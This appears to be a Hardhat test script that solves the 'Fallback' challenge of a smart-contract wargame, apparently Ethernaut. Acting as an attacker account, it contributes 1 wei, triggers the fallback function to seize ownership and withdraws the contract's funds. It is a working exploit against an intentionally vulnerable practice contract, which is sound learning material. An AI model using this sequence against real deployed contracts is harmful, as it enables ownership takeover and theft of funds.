import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { assert } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";

const INSTANCE_ADDRESS = "0xdA6Bd2EFBb32F533915A46cFc8f28b894f81BC8d";

let owner: SignerWithAddress;
let attacker: SignerWithAddress;
let txn: any;
let contract: Contract;

describe.only("Fallback", () => {

    beforeEach(async () => {
        [owner, attacker] = await ethers.getSigners();

        contract = await ethers.getContractAt(
            "Fallback",
            INSTANCE_ADDRESS,
            owner
        )
    });

    it("Should solve the challenge", async function () {

        const initialOwner = await contract.owner();
        console.log(`initial owner: ${initialOwner}`);
        // call contribute to add attacker address to contributions mapping
        txn = await contract.connect(attacker).contribute({
            value: ethers.utils.parseUnits(`1`, `wei`),
        });
        await txn.wait();

        // submit the fallback function as attacker
        const fallbackTxn: any = {
            to: INSTANCE_ADDRESS,
            value: ethers.utils.parseUnits(`1`, `wei`),
        };
        txn = await attacker.sendTransaction(fallbackTxn);
        await txn.wait();

        // drain the contract
        txn = await contract.connect(attacker).withdraw();
        await txn.wait();

        const currentOwner = await contract.owner();
        console.log(`current owner: ${currentOwner}`);
        assert(initialOwner != currentOwner);
    });
});